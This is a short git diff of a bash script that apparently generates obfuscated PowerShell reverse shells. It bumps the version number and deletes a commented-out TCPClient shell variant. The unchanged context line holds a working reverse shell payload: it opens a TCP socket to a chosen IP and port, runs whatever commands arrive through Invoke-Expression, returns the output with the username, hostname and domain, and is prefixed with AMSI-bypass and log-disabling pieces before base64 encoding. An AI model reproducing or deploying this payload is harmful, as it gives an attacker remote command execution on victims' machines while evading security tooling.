@@ -4,7 +4,7 @@
 #Mastadon: 4ndr34z@infosec.exchange
 #Web: https://f20.be
 
-version="1.5.7"
+version="1.5.8"
 
 ### Colors ##
 ESC=$(printf '\033') RESET="${ESC}[0m" BLACK="${ESC}[30m" RED="${ESC}[31m"
@@ -691,7 +691,7 @@ else
     
     #TCP
     shell="$AMSIb$disableLog$fAMSIb$func\$$ip='$IP';\$$port=$PORT;\$$socket=New-Object Net.\$$placeh\"Sockets.Socket\"([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Stream, [Net.Sockets.ProtocolType]::Tcp);\$$socket.Connect(\$$ip, \$$port);while (\$true) {\$Error.Clear();\$$input = New-Object byte[] \$$socket.ReceiveBufferSize;\$$read=\$$socket.Receive(\$$input);\$$cmd=[text.encoding]::UTF8.GetString(\$$input,0, \$$read);try {\$$output=Invoke-Expression -Command \$$cmd | Out-String;} catch {\$$output = \$_.Exception.Message+([System.Environment]::NewLine);}if (!\$$output) {\$$output = \$Error[0].Exception.Message};\$$info=(\$env:UserName)+'@'+(\$env:COMPUTERNAME)+'.'+(\$env:USERDNSDOMAIN)+([System.Environment]::NewLine)+(get-location)+'>';\$$outbytes=[text.encoding]::UTF8.GetBytes(\$$output+\$$info);if(\$$cmd -eq ''){\$$socket.Close();exit;}else{\$$socket.Send(\$$outbytes);}}"
-    #shell="$AMSIb$disableLog$fAMSIb$func\$$client = New-Object Net.\$$placeh\"Sockets.TCPClient\"('$IP',$PORT);\$$stream = \$$client.GetStream();[byte[]]\$$bytes = 0..65535|%{0};while((\$$i = \$$stream.Read(\$$bytes, 0, \$$bytes.Length)) -ne 0){;\$$data = (New-Object -TypeName Text.UTF8Encoding).GetString(\$$bytes,0,\$$i);\$$sendback = (Invoke-expression \". { \$$data } 2>&1\" | Out-String ); \$$sendback2 = \$$sendback + (\$env:UserName) + '$at' + (\$env:UserDomain) + ([Environment]::NewLine) + (get-location)+'>';\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$$sendback2);\$$stream.Write(\$$sendbyte,0,\$$sendbyte.Length);\$$stream.Flush()};\$$client.Close()"
+    
 fi
 
 shell=$(echo -n $shell | iconv --to-code UTF-16LE | $benc --base64 -w0)
